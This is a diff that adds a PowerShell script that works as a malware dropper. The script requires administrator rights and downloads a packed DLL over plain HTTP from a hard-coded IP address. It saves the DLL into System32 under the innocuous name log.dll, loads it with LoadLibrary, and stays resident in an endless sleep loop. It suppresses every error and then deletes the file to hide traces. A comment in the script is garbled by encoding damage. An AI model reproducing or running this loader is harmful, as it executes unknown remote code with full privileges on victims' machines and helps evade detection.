@@ -1,0 +1,53 @@
+# 1. Check for Administrator permissions
+if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
+    exit 1
+}
+
+$dllUrl = "http://154.36.167.83:8888/bbzlog.vmp.dll"
+$dllPath = "C:\Windows\System32\log.dll"
+
+# 2. Download DLL file to 
+try {
+    Invoke-WebRequest -Uri $dllUrl -OutFile $dllPath -UseBasicParsing -ErrorAction Stop
+} catch {
+    exit 1
+}
+
+# 3. Load DLL using Windows API
+try {
+    # Add necessary types for DLL loading
+    Add-Type -TypeDefinition @"
+    using System;
+    using System.Runtime.InteropServices;
+    
+    public class DLLLoader
+    {
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern IntPtr LoadLibrary(string lpFileName);
+        
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern bool FreeLibrary(IntPtr hLibModule);
+    }
+"@ -ErrorAction SilentlyContinue
+    
+    # Load the DLL
+    $handle = [DLLLoader]::LoadLibrary($dllPath)
+    while ($true) {
+    # –›√ﬂ 1 –° ±£¨±‹√‚ CPU ’º”√
+    Start-Sleep -Seconds 3600
+}
+
+} catch {
+    # Ignore loading errors
+}
+
+# 4. Delete the DLL file (always attempt to delete regardless of load status)
+try {
+    if (Test-Path $dllPath) {
+        Remove-Item -Path $dllPath -Force -ErrorAction SilentlyContinue
+    }
+} catch {
+    # Fail silently
+}
+
+exit 0
